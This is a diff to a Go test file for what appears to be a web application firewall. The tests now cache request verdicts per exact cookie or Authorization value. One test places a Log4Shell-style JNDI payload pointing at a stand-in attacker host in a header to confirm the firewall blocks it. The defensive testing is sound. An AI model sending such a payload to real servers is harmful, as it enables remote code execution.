@@ -336,30 +336,35 @@ func TestCheckCachedAllowDoesNotCoverHeaderPayload(t *testing.T) {
 	}
 }
 
-// TestCheckNeverCachesCookieOrAuthRequests proves requests carrying a
-// session cookie or Authorization header are excluded from the verdict
-// cache entirely (issue #13's identity-safety requirement) — a
-// method+path+query+body fingerprint doesn't capture "which logged-in user."
-func TestCheckNeverCachesCookieOrAuthRequests(t *testing.T) {
+// TestCheckCachesPerCookie pins issue #291: requests with cookies or
+// Authorization are cached, but only per exact value. A payload in one
+// user's cookie is never answered by another user's cached allow, and an
+// identical repeat is a hit.
+func TestCheckCachesPerCookie(t *testing.T) {
 	e := newTestEngine(t)
-
-	withCookie := httptest.NewRequest("GET", "http://app.example.com/account", nil)
-	withCookie.Header.Set("User-Agent", "Mozilla/5.0")
-	withCookie.Header.Set("Cookie", "session=abc123")
-	if _, err := e.Check(withCookie, "203.0.113.9"); err != nil {
-		t.Fatalf("check (cookie): %v", err)
+	newReq := func(header, value string) *http.Request {
+		r := httptest.NewRequest("GET", "http://app.example.com/account", nil)
+		r.Header.Set("User-Agent", "Mozilla/5.0")
+		r.Header.Set(header, value)
+		return r
 	}
-	if got := e.cache.order.Len(); got != 0 {
-		t.Fatalf("cache entries after cookie-bearing request = %d, want 0", got)
-	}
-
-	withAuth := httptest.NewRequest("GET", "http://app.example.com/api", nil)
-	withAuth.Header.Set("Authorization", "Bearer abc123")
-	if _, err := e.Check(withAuth, "203.0.113.9"); err != nil {
-		t.Fatalf("check (authorization): %v", err)
-	}
-	if got := e.cache.order.Len(); got != 0 {
-		t.Fatalf("cache entries after Authorization-bearing request = %d, want 0", got)
+	for _, header := range []string{"Cookie", "Authorization"} {
+		clean, err := e.Check(newReq(header, "session=abc123"), "203.0.113.9")
+		if err != nil || clean.Blocked {
+			t.Fatalf("%s clean: %+v %v", header, clean, err)
+		}
+		hits := VerdictCacheHits()
+		if again, _ := e.Check(newReq(header, "session=abc123"), "203.0.113.9"); again.Blocked || VerdictCacheHits() != hits+1 {
+			t.Errorf("%s repeat: blocked=%v hits %d -> %d, want a cache hit", header, again.Blocked, hits, VerdictCacheHits())
+		}
+		misses := VerdictCacheMisses()
+		evil, err := e.Check(newReq(header, "session=${jndi:ldap://attacker.example/a}"), "203.0.113.9")
+		if err != nil || !evil.Blocked {
+			t.Errorf("%s payload allowed (%v): served another value's cached verdict", header, err)
+		}
+		if VerdictCacheMisses() != misses+1 {
+			t.Errorf("%s payload: misses %d -> %d, want one miss", header, misses, VerdictCacheMisses())
+		}
 	}
 }
 
@@ -469,13 +474,13 @@ func TestSetRequestSchemaOffClearsSchema(t *testing.T) {
 // while a small one still passes (#261).
 func TestInspectionSlots(t *testing.T) {
 	e := newTestEngine(t)
+	e.cache.ttl = 0 // every check runs the rules
 	defer func(d time.Duration) { inspectWait = d }(inspectWait)
 	inspectWait = 10 * time.Millisecond
 
 	check := func(body string) error {
 		r := httptest.NewRequest("POST", "http://app.example.com/api", strings.NewReader(body))
 		r.Header.Set("Content-Type", "application/json")
-		r.Header.Set("Cookie", "s=1") // keep the verdict cache out of it
 		_, err := e.Check(r, "203.0.113.9")
 		return err
 	}
@@ -511,6 +516,7 @@ func TestInspectionSlots(t *testing.T) {
 // a prompt body leaves the connection without one.
 func TestSlowBodyTimesOut(t *testing.T) {
 	e := newTestEngine(t)
+	e.cache.ttl = 0 // every check runs the rules
 	defer func(d time.Duration, r int64) { bodyGrace, bodyMinRate = d, r }(bodyGrace, bodyMinRate)
 	bodyGrace, bodyMinRate = 100*time.Millisecond, 1<<30 // no per-byte allowance
 
@@ -533,7 +539,6 @@ func TestSlowBodyTimesOut(t *testing.T) {
 			pr, pw := io.Pipe()
 			req, _ := http.NewRequest("POST", srv.URL+"/api", pr)
 			req.Header.Set("Content-Type", contentType)
-			req.Header.Set("Cookie", "s=1") // keep the verdict cache out of it
 			go func() {
 				_, _ = pw.Write([]byte(`{"a":`))
 				time.Sleep(stall)
